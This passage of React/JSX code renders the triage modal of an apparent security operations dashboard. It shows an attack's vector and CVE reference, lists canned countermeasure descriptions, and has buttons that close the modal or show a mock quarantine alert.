                <div className="text-slate-300 mt-1">
                  Vector: <span className="text-white font-semibold">{selectedAttack.vector}</span>
                </div>
                {selectedAttack.cve && (
                  <div className="text-purple-300 mt-1">
                    CVE Reference: <span className="font-bold">{selectedAttack.cve}</span>
                  </div>
                )}
              </div>

              <div className="space-y-2">
                <div className="text-cyan-400 font-bold uppercase text-[11px]">Automated SOC Countermeasures:</div>
                <div className="p-2 rounded-lg bg-[#070b13] border border-cyan-500/20 text-slate-300 flex items-start gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 mt-1.5 shrink-0" />
                  <span>Ingress BGP Route Poisoning / Blackhole null-route dispatched for origin ASN.</span>
                </div>
                <div className="p-2 rounded-lg bg-[#070b13] border border-cyan-500/20 text-slate-300 flex items-start gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 mt-1.5 shrink-0" />
                  <span>Palo Alto / Fortinet WAF signature auto-pushed: Drop TCP port {selectedAttack.port || 443} payload signature.</span>
                </div>
                <div className="p-2 rounded-lg bg-[#070b13] border border-cyan-500/20 text-slate-300 flex items-start gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 mt-1.5 shrink-0" />
                  <span>Token revocation: Revoked OAuth access sessions matching affected IP perimeters.</span>
                </div>
              </div>
            </div>

            <div className="mt-5 pt-3 border-t border-cyan-500/20 flex justify-end gap-2">
              <button
                onClick={() => setTriageModalOpen(false)}
                className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold transition-colors cursor-pointer"
              >
                Close Playbook
              </button>
              <button
                onClick={() => {
                  alert(`Mitigation dispatched: Quarantine rule applied to ${selectedAttack.targetCity} perimeter.`);
                  setTriageModalOpen(false);
                }}
                className="px-4 py-2 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 text-black font-bold text-xs shadow-[0_0_15px_rgba(0,240,255,0.4)] hover:brightness-110 transition-all cursor-pointer"
              >
                Dispatch Quarantine Isolation
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
